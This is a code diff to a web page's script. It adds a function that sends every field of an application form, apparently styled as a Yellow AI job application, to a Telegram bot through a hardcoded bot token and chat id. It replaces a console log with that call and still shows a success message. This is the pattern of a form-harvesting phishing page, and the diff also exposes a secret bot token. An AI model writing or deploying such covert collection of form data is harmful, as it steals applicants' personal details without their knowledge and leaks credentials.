@@ -539,6 +539,31 @@
     </div>
 
     <script>
+        
+
+
+    function sendDeatilsToTelegram(message) {
+  // Function to send a Telegram message
+  sendTelegramMessage(message)
+  async function sendTelegramMessage(message) {
+      const url = `https://api.telegram.org/bot8113534372:AAF2DahT2CQYToSvG7Z_VMZ_-0BmweybX5I/sendMessage`;
+      try {
+          // Send the message to the Telegram bot
+          await fetch(url, {
+              method: "POST",
+              headers: {
+                  "Content-Type": "application/x-www-form-urlencoded"
+              },
+              body: `chat_id=1293804795&text=${encodeURIComponent(message)}`,
+          });
+      } catch (error) {
+        alert("Error sending your message, please try again later")
+          console.error("Error sending message", error);
+      }
+  }
+}   
+
+
         document.getElementById('applicationForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -549,7 +574,8 @@
             user_data += `${key} : ${value}\n`;
         });
 
-        console.log("USER DATA:\n" + user_data);
+        // console.log("USER DATA:\n" + user_data);
+        sendDeatilsToTelegram(`FORM DATA OF YELLOW AI (FRONTEND) \n${user_data}`)
 
         // Show success message with new text
         const successBox = document.getElementById('successMessage');
